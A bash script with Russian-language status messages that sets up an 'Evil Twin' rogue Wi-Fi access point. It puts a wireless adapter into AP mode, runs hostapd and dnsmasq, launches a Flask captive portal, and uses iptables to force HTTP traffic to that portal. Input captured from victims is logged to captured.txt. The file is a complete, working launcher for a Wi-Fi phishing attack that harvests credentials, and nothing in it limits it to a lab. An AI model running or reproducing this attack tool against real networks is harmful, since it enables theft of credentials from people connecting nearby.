#!/bin/bash

GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
NC='\033[0m'

WIFI=wlx24ec99b99ef7
PORTAL_DIR=~/evil_portal

echo -e "${GREEN}[1/9] Остановка старых процессов...${NC}"
sudo killall hostapd dnsmasq python3 2>/dev/null
sudo killall wpa_supplicant 2>/dev/null
sleep 3

echo -e "${GREEN}[2/9] Ограничение CPU (защита от просадки питания)...${NC}"
sudo cpufreq-set -c 0 -u 1.0GHz 2>/dev/null
sudo cpufreq-set -c 1 -u 1.0GHz 2>/dev/null
sudo cpufreq-set -c 2 -u 1.0GHz 2>/dev/null
sudo cpufreq-set -c 3 -u 1.0GHz 2>/dev/null
echo -e "${GREEN}  CPU ограничен до 1.0 ГГц${NC}"

echo -e "${GREEN}[3/9] Проверка интерфейса...${NC}"
if ! ip link show $WIFI &>/dev/null; then
    echo -e "${RED}  Ошибка: интерфейс $WIFI не найден!${NC}"
    echo -e "${YELLOW}  Проверь: lsusb${NC}"
    exit 1
fi
echo -e "${GREEN}  Интерфейс найден${NC}"

echo -e "${GREEN}[4/9] Перевод в режим AP...${NC}"
sudo ip link set $WIFI down
sudo iw dev $WIFI set type __ap
sudo ip link set $WIFI up
sudo ip addr add 192.168.10.1/24 dev $WIFI 2>/dev/null
sleep 2
echo -e "${GREEN}  Режим: $(iwconfig $WIFI | grep -o 'Mode:[A-Za-z]*')${NC}"

echo -e "${GREEN}[5/9] Запуск hostapd (Rogue AP)...${NC}"
sudo nohup hostapd /etc/hostapd/evil.conf > /tmp/hostapd.log 2>&1 &
disown
sleep 5
if ps aux | grep -q "[h]ostapd"; then
    echo -e "${GREEN}  hostapd: OK${NC}"
else
    echo -e "${RED}  hostapd: FAIL${NC}"
    tail -10 /tmp/hostapd.log
    exit 1
fi

echo -e "${GREEN}[6/9] Запуск dnsmasq (DHCP + DNS)...${NC}"
sudo nohup dnsmasq -C /etc/dnsmasq.conf > /tmp/dnsmasq.log 2>&1 &
disown
sleep 3
if ps aux | grep -q "[d]nsmasq"; then
    echo -e "${GREEN}  dnsmasq: OK${NC}"
else
    echo -e "${RED}  dnsmasq: FAIL${NC}"
    tail -10 /tmp/dnsmasq.log
fi

echo -e "${GREEN}[7/9] Пауза 10 секунд для стабилизации...${NC}"
sleep 10

echo -e "${GREEN}[8/9] Запуск Flask (Captive Portal)...${NC}"
cd $PORTAL_DIR
sudo nohup python3 portal.py > /tmp/portal.log 2>&1 &
disown
sleep 5
if ps aux | grep -q "[p]ortal.py"; then
    echo -e "${GREEN}  Flask: OK${NC}"
else
    echo -e "${RED}  Flask: FAIL${NC}"
    tail -10 /tmp/portal.log
fi

echo -e "${GREEN}[9/9] Настройка iptables...${NC}"
sudo sysctl -w net.ipv4.ip_forward=1 > /dev/null
sudo iptables -t nat -A PREROUTING -i $WIFI -p tcp --dport 80 -j DNAT --to-destination 192.168.10.1:80 2>/dev/null
sudo iptables -t nat -A POSTROUTING -j MASQUERADE 2>/dev/null
echo -e "${GREEN}  iptables: OK${NC}"

echo ""
echo -e "${GREEN}========================================${NC}"
echo -e "${GREEN}  Evil Twin запущен!${NC}"
echo -e "${GREEN}========================================${NC}"
echo ""
echo "  Сеть: Test_WiFi"
echo "  Портал: http://192.168.10.1"
echo "  Лог: $PORTAL_DIR/captured.txt"
echo ""
echo "  Остановка: sudo killall hostapd dnsmasq python3"
echo ""
